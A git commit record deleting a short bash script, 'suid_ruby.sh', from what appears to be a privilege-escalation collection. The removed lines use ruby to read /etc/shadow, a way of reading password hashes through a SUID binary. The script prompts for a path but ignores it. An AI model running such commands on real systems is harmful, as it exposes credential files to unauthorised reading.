2dab983e90f6c2ed3b807d275cd2ef5afc9dd8de
Akash Pandey <75413146+1337-L3V1ATH0N@users.noreply.github.com>
2021-06-25 12:58:49 +0530

    Delete suid_ruby.sh

--- rw-binaries/suid_ruby.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-echo -n "[+] Enter file path(eg:- /etc/shadow): "
-read filepath
-echo "To view other file change the /etc/shadow postion to your file path."
-ruby -e 'puts File.read("/etc/shadow")'
